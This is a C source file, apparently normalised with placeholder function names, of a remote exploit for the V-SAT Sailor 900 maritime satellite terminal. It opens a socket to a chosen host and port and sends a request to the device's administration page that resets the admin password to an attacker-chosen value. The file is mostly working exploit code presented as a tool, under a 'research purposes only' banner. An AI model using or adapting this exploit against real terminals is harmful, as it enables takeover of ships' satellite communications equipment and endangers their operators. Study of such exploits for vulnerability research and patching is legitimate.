#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
struct timeval {int tv_sec; scalar_t__ tv_usec; } ;
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {int /*<<< orphan*/  sin_zero; int /*<<< orphan*/  sin_family; TYPE_1__ sin_addr; int /*<<< orphan*/  sin_port; } ;
struct sockaddr {int dummy; } ;
struct in_addr {int /*<<< orphan*/  s_addr; } ;
struct hostent {int /*<<< orphan*/  h_name; scalar_t__ h_addr; } ;
typedef  int socklen_t ;
typedef  int /*<<< orphan*/  fd_set ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int /*<<< orphan*/  FUNC0 (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  F_GETFL ; 
 int /*<<< orphan*/  F_SETFL ; 
 int /*<<< orphan*/  INADDR_ANY ; 
 long O_NONBLOCK ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/  SOL_SOCKET ; 
 int /*<<< orphan*/  SO_ERROR ; 
 int /*<<< orphan*/  FUNC2 (char*) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int FUNC4 (int,struct sockaddr*,int) ; 
 scalar_t__ errno ; 
 int /*<<< orphan*/  FUNC5 (int) ; 
 int FUNC6 (int,int /*<<< orphan*/ ,long) ; 
 int /*<<< orphan*/  FUNC7 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC8 (int /*<<< orphan*/ ,char*,...) ; 
 struct hostent* FUNC9 (void*) ; 
 int /*<<< orphan*/  FUNC10 (int,int /*<<< orphan*/ ,int /*<<< orphan*/ ,void*,int*) ; 
 int /*<<< orphan*/  FUNC11 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC12 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC13 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int) ; 
 int FUNC14 (int,int /*<<< orphan*/ ,char*,char*) ; 
 int /*<<< orphan*/  FUNC15 (char*) ; 
 int /*<<< orphan*/  FUNC16 (char*) ; 
 int FUNC17 (int,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *,struct timeval*) ; 
 int FUNC18 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  stdout ; 
 char* FUNC19 (int) ; 

int FUNC20 (int argc, char *argv[]) {


   char *pg  = "/index.lua?pageID=administration";
   char *pss = "&usernameAdmChange=admin"
               "&passwordAdmChange=aisatpwn2134";

   // char *cval = "tt_adm=tt_adm=694020";

   long arg;
   int sock, opt, evalopt, s;


if(argc < 2)
{
      FUNC16("***********************************************************************\n");
      FUNC16("(Advanced Information Security Corporation, 2014 - All Rights Reserved*\n");
      FUNC16("***********************************************************************\n");
      FUNC16("*                                                                     *\n");
      FUNC16("*                (V-SAT SAILOR 900 Remote Exploit)                    *\n");
      FUNC16("***********************************************************************\n");
      FUNC16("* Disclaimer: This is proprietary source code material of Advanced    *\n");
      FUNC16("* Information Security Corporation. This software is for              *\n");
      FUNC16("* research purposes only.                                             *\n");
      FUNC16("***********************************************************************\n");
      FUNC16("*    VSAT Sailor 900 / Tested on iDirect Infiniti VMU v.1.47 Build 9  *\n");
      FUNC16("* Description:                                                        *\n");
      FUNC16("* The Sailor 900 VSAT is an advanced maritime stabilised Ku/Ka band   *\n");
      FUNC16("* platform with integrated GPS, compatible with a number of satellite *\n");
      FUNC16("* networks, such as Jabiru, Inmarsat GX, and Intelsat's Epic.         *\n");
      FUNC16("***********************************************************************\n");
      FUNC16("\n\n");
      FUNC8(stderr, " Main Menu \n");
      FUNC8(stderr, " Usage: %s <host> <port>\n", argv[0]);
      FUNC5(1);
}
   struct timeval tv;
   struct sockaddr_in remote;
   struct hostent *host;
   socklen_t lon;


   host = FUNC9((void *)argv[1]);

   fd_set wset;
   fd_set rset;

  sock = FUNC18(AF_INET,SOCK_STREAM,0);
  remote.sin_port = FUNC12(FUNC2(argv[2]));
  remote.sin_addr.s_addr =  FUNC11(INADDR_ANY);
  remote.sin_addr.s_addr = ((struct in_addr *)(host->h_addr))->s_addr;
  remote.sin_family = AF_INET;
  FUNC13(remote.sin_zero,0,sizeof(remote.sin_zero));
  FUNC7(stdout);


  if (sock == -1) {
    FUNC15("socket creation error");
   return -1;
  }
  FUNC1( &wset );
  FUNC0( sock , &wset );

  FUNC1( &rset );
  FUNC0( sock , &rset );

  tv.tv_sec  = 3;
  tv.tv_usec = 0;


 s = FUNC4(sock,(struct sockaddr *)&remote,sizeof(struct sockaddr));
 if (s == -1 ) {
    FUNC15("connection ");
   return -1;}

  if( errno != 0) {
    FUNC15("connection ");
   return -1;
  }

   arg = FUNC6(sock, F_GETFL, NULL);
   arg |= O_NONBLOCK;
   FUNC6(sock, F_SETFL, arg);
  if( FUNC6( sock , F_SETFL , O_NONBLOCK ) == -1 ) {
    FUNC15("fcntl error");
   return -1;
  }

  opt = FUNC17(sock+1,NULL,&wset,NULL,&tv);

  if( opt == -1 ) {
    FUNC15("select");
   return -1;
  }
  if (opt > 0) {
  lon = sizeof(int);
  FUNC10(sock, SOL_SOCKET, SO_ERROR, (void*)(&evalopt), &lon);

 if (evalopt) {
              FUNC8(stderr, "Socket Connection Error Code at: %d - %s\n", evalopt, FUNC19(evalopt));
              FUNC5(0);
           }


if( FUNC6( sock , F_SETFL , 0 ) == -1 ) {
    FUNC15("fcntl");
    FUNC16("[RST-FCNTL] FCNTL Error. Exiting the software.\n\n");
   return -1;
}


if( FUNC14(sock,host->h_name,pg,pss) != 1) FUNC16("\n\n[x] Payload Sent. Please check server responses above to verify status.\n\n");


  arg = FUNC6(sock, F_GETFL, NULL);
  arg &= (~O_NONBLOCK);
  FUNC6(sock, F_SETFL, arg);

        FUNC3(sock);
        FUNC5(1);
 }

}